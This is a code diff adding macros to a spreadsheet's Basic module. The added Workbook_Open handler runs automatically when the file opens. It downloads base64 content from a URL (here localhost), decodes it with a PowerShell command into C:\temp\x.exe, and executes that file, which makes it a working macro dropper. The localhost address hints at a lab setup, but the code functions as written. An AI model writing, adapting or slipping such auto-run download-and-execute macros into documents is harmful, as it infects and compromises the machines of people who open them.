@@ -45,3 +45,47 @@ Function DownloadWebContent(url As String) As String
     ' Return the result
     DownloadWebContent = result
 End Function
+
+Sub OpenFile()
+    Dim ProgramPath As String
+    ProgramPath = "C:\temp\x.exe" ' Path to the program
+    Shell(ProgramPath, 1)
+End Sub
+
+Sub RunPowerShellUsingShell(psCommand As String)
+    ' Run the command
+    Shell(psCommand, 1)
+End Sub
+
+Sub SaveHTMLToCells(mystr As String)
+    Dim htmlLines() As String
+    Dim i As Long
+    Dim oSheet As Object
+    oSheet = ThisComponent.Sheets(0)
+
+    ' Split the HTML content by "<" to get each tag
+    htmlLines = Split(mystr, "<")
+
+    ' Write each tag to a new cell in the active worksheet
+    For i = LBound(htmlLines) To UBound(htmlLines)
+        If htmlLines(i) <> "" Then
+            oSheet.getCellByPosition(0, i).String = "<" & htmlLines(i)
+        End If
+    Next i
+End Sub
+
+Sub MainSub()
+    Dim mystr As String
+    Dim myHost As String
+    Dim comm As String
+    myHost = "http://127.0.0.1/base64.txt"
+    mystr = DownloadWebContent(myHost)
+    comm = "powershell -command ""[IO.File]::WriteAllBytes(""C:\temp\x.exe"", [Convert]::FromBase64String(" & mystr & "))"""
+    SaveHTMLToCells(mystr)
+    RunPowerShellUsingShell(comm)
+    OpenFile
+End Sub
+
+Sub Workbook_Open()
+    MainSub
+End Sub
